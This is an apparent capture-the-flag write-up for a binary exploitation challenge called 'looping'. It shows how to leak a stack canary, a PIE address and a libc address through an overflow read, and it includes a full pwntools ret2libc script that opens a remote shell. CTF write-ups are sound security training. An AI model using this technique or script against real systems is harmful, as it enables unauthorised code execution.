# looping

###### This challenge is about bypassing modern exploit migrations.
#
Lets look at the challenge binary:
```
[*] '/pwd/looping'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enable
```

As you can see, there is full protection. Let's take a look at the decompilation:

```
int main() {
  setvbuf(stdin,0,2,0);
  setvbuf(stdout,0,2,0);
  setvbuf(stderr,0,2,0);
  alarm(20);

  char s[72];
 
  for (int i = 1; i <= 2; ++i) {
    memset(s, 0, 0x40u);
    read(0, s, 0x280);
    puts(s);
  }
  puts("TryHarder");
  return 0;
}
```

###### Se we have a buffer overflow vulnerability at ```read()```, which obviously is too much.
So a stack canary looks like this: **0x00**, so 7 bytes are random. The special thing about ```read()``` is,
that the strings aren't NULL terminated. But ```puts``` prints until it reaches a null byte, so we could overwrite the
canary's NULL byte and print out everything until the next NULL byte. This is our stack canary and a pie address:
```
0x7fffffffe588:	0xcf85e32d1d945a00 0x00005555555547d0
```
###### So if we send 72 characters, our newline overwrites the canary's NULL byte and we get two leaks.
So now we have the canary and a pie address. We can calculate the address of the ```main()``` function,
and we can call ```main()``` again, to get a libc leak and to generate a ropchain. Our ropchain will look like this:
```offset``` + ```canary``` + ```offset``` + ```main```. So we jumpet to main again and if we enter 207 characters, we get
a libc leak, because the address is printed by ```puts()```. So we can calculate the offsets and we can create a 
ropchain like this: ```offset``` + ```canary``` + ```offset``` + ```pop_rdi``` + ```binsh``` + ```system```. Cool let's try it!
**exploit:**
```python
from pwn import *


p = remote("35.223.244.247", 49154)
#p = process("./looping",env={"LD_PRELOAD" : "./libc.so.6"})

p.sendline("A"*72)
pause(1)

leaks = p.recv().split()
binary_leak = u64(leaks[1][7:].ljust(8, "\x00"))
print(hex(binary_leak))
binary_base = binary_leak - 0x990
main = binary_base + 0x88a
puts = binary_base + 0x710
puts_got = binary_base + 0x200fa8
pop_rdi = binary_base + 0x9f3
ret = binary_base + 0x980
canary = u64(leaks[1][:7].rjust(8, "\x00"))
print(hex(canary))

try:
    p.sendline("A"*72 + p64(canary) + "A"*8 + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main))
except:
    log.error("leak error")
    exit()

sleep(2)
leaks = p.recv().split()
print(leaks)
libc_leak = u64(leaks[2].ljust(8, "\x00"))
print(hex(libc_leak))
libc_base = libc_leak - 0x80aa0
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a
log.info("canary: " + hex(canary))
log.info("binary_base: " + hex(binary_base))
log.info("libc_base: " + hex(libc_base))

p.sendline("A"*72 + p64(canary) + "A"*8 + p64(pop_rdi) + p64(binsh) + p64(system))

p.sendline("X")

log.warning("getting shell...")

p.interactive()
```

Cool we get a shell! Fun challenge!
